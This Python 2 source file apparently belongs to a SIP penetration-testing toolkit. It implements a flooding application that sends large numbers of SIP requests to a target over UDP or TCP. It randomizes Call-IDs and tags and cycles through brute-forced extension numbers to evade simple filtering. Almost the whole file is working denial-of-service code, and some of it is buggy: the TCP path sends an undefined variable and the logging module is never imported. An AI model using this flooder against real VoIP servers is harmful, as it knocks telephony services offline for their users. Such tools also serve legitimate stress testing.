
# Flooding App
import socket, multitask, random
from std import rfc3261, rfc2396
from sipot import App, User, logger

class flooderUser(User):
	'''The User object provides a layer between the application and the SIP stack.'''
	REGISTERED, FLOODING, UDP, TCP, TLS = 'Registered user','User flooding', 'udp', 'tcp', 'tls' # transport values
	def __init__(self, app):
		User.__init__(self,app)
        #Flooder options
		self.wait_register = app.options.register
		self.flood_num = app.options.flood_num
		self.flood_method = app.options.flood_method
		self.flood_msg = 0
		self.start_flood_time = None
		self.flood_msg_file = app.options.flood_msg_file
	
	def add_floodGen(self):
		self.state = self.FLOODING
		if not self._floodGen:
			self._floodGen  = self._flood()
			multitask.add(self._floodGen)
		return self
	def _flood(self):
		# Flood info messages ---------
		def floodingCtrl():
			if self.state == self.FLOODING:
				import datetime
				def log_perc_completed(i, partials, total=self.flood_num):
					partials = map(int,(partials.split(',')))
					for partial in partials:
						if i == (partial*total/100):
							logger.info(str((datetime.datetime.now()-self.start_flood_time).total_seconds()*1000)+' msec'+':		'+str(int((total*partial/100)//1))+'/'+str(total)+' ('+str(int((partial)//1))+'%) messages sent')
				if not self.start_flood_time:
					self.start_flood_time = datetime.datetime.now()
				self.flood_msg += 1
				log_perc_completed(self.flood_msg,'25,50,75,100')
		# Msg to flood generator ---------
		def _createBaseMessage():
			if self.flood_msg_file:
				with open (self.flood_msg_file, "r") as file_txt:
					file_txt=file_txt.read()
				m = rfc3261.Message()
				try:
					m = m._parse(file_txt)
				except ValueError, E: pass # TODO: send 400 response to non-ACK request
			else:
				m = self._ua.createRequest(self.flood_method)
				m.Contact = rfc3261.Header(str(self._stack.uri), 'Contact')
				m.Contact.value.uri.user = self.localParty.uri.user
				m.Expires = rfc3261.Header(str(self.app.options.register_interval), 'Expires')
			return m
		def _createFloodMsgGen(message_generated):
			if self.app.options.modify_extentions:
				if self.app.options.ExtDictionary is not None:
					try:
						dictionary = open(self.app.options.ExtDictionary,'r')
					except IOError:
						logging.error( "Could not open %s" % self.app.options.ExtDictionary )
						exit(1)
					self.ExtensionsGenerator =  loopExtentionsDictionary(dictionary)
				else:
					self.ExtensionsGenerator = generateExtentions(*(self.app.options.ExtRange,self.app.options.ExtZeropadding,self.app.options.ExtTemplate,self.app.options.ExtDefaults))
				self.message_generated = message_generated
				while True:
					message_generated = self.message_generated
					# Modify message_generated: extension (To,From), tag, Call-ID
					extension = self.ExtensionsGenerator.next()
					message_generated.From.value.uri.user = message_generated.From.value.displayName =  message_generated.To.value.uri.user = message_generated.To.value.displayName = extension
					message_generated.From.tag=str(random.randint(0,2**31))
					message_generated['Call-ID'] = rfc3261.Header(str(random.randint(0,2**31)) + '@' + (message_generated.From.value.uri.host or 'localhost'), 'Call-ID')
					yield (message_generated)
			else:
				while True:
					yield (message_generated)
		# Helpers ---------
		def generateExtentions(rangelist,zeropadding=0,template=None,defaults=False,staticbrute=[]):
			"""generateExtentions gives a yield generator. accepts either zeropadding or template as optional argument"""
			def getRange(rangestr):
				_tmp1 = rangestr.split(',')
				numericrange = list()
				for _tmp2 in _tmp1:
					_tmp3 = _tmp2.split('-',1)
					if len(_tmp3) > 1:        
						if not (_tmp3[0].isdigit() or _tmp3[1].isdigit()):
							raise ValueError, "the ranges need to be digits"                
							return            
						startport,endport = map(int,[_tmp3[0],_tmp3[1]])
						endport += 1
						numericrange.append(xrange(startport,endport))
					else:
						if not _tmp3[0].isdigit():
							raise ValueError, "the ranges need to be digits"                
							return
						singleport = int(_tmp3[0])
						numericrange.append(xrange(singleport,singleport+1))
				return numericrange
			rangelist = getRange(rangelist)
			while 1:
				for statictry in staticbrute:
					yield(statictry)
				if defaults:
					for i in xrange(1000,9999,100):
						yield('%04i' % i)
					
					for i in xrange(1001,9999,100):
						yield('%04i' % i)
						
					for i in xrange(0,9):
						for l in xrange(1,8):
							yield(('%s' % i) * l)
					
					for i in xrange(100,999):
						yield('%s' % i)
				
					for i in xrange(10000,99999,100):
						yield('%04i' % i)
					
					for i in xrange(10001,99999,100):
						yield('%04i' % i)
					
					for i in [1234,2345,3456,4567,5678,6789,7890,0123]:
						yield('%s' % i)
				
					for i in [12345,23456,34567,45678,56789,67890,01234]:
						yield('%s' % i)
				if zeropadding > 0:
					format = '%%0%su' % zeropadding
				elif template is not None:
					format = template
				else:
					format = '%u'
				# format string test
				format % 1 
				for x in rangelist:
					for y in x:
						r = format % y
						yield(r)			
		def loopExtentionsDictionary(dictionaryfile):
			while 1:
				for line in dictionaryfile:
					yield(line.strip())
				dictionaryfile.seek(0)
				r = dictionaryfile.readline()
			dictionaryfile.close()
		# Dest Address
		addr =  self.remoteTarget.uri.hostPort 
		if addr and isinstance(addr, rfc2396.URI):
			if not addr.host: raise ValueError, 'No host in destination uri'
			addr = (addr.host, addr.port or self.transport.type == 'tls' and self.transport.secure and 5061 or 5060)
		# Msg generator
		base_msg = _createBaseMessage()
		flood_msg = _createFloodMsgGen(base_msg)
		print "Flooding %s %s messages to %s" % (self.flood_num, base_msg.method, addr)
		try:
			if self.sock:
				if self.sock.type == socket.SOCK_STREAM:
					try: 
						remote = self.sock.getpeername()
						if remote != addr:
							logger.debug('connected to wrong addr', remote, 'but sending to', addr)
					except socket.error: # not connected, try connecting
						try:
							self.sock.connect(addr)
						except socket.error:
							logger.debug('failed to connect to', addr)
					try:
						for i in range(self.flood_num):
							logger.debug('[Msg:%s/%s] sending[%d] to %s\n%s'%((self.flood_msg+1),self.flood_num,len(data), addr, ''))
							self.sock.send(data)
							floodingCtrl()
						self.app.stop()
						yield
						raise StopIteration()
					except socket.error:
						logger.debug('socket error in send')
				elif self.sock.type == socket.SOCK_DGRAM:
					try:
						for i in range(self.flood_num):
							data = str(flood_msg.next())
							logger.debug('[Msg:%s/%s] sending[%d] to %s\n%s'%((self.flood_msg+1),self.flood_num,len(data), addr, ''))
							logger.debug(data)
							self.sock.sendto(data, addr)
							floodingCtrl()
						self.app.stop()
						yield
						raise StopIteration()
					except socket.error:
						logger.debug('socket error in sendto' )
				else:
					logger.debug('invalid socket type', self.sock.type)
		except AttributeError: pass
		

class FloodingApp(App):
	def __init__(self, options):
		App.__init__(self,options)
		logger.info("ntsga: init fuzzing app")

	def createUser(self):
		self.user = flooderUser(self).createClient()
		return self
		
	def mainController(self):
		logger.info("ntsga: start flooding controller")
		while True:
			self.user.add_floodGen()
			if not self.user.state == self.user.FLOODING:
				self.stop()
				raise StopIteration()
			yield
		# Not needed for FLOODING ...
		if self.status: # Print app status
			print self.status.pop(0)
		# If not register needed or already registered => flood
		if not self.options.register or (self.options.register and self.user.reg_state==self.user.REGISTERED):
			while True:
				self.user.add_floodGen()
				if not self.user.state == self.user.FLOODING:
					self.stop()
					raise StopIteration()
		# If register needed and could not register = > stop app
		elif not (self.user.reg_result=='success' or self.user.reg_result==None):
			print 'Could not register user.'
			self.stop()
			raise StopIteration()
		yield
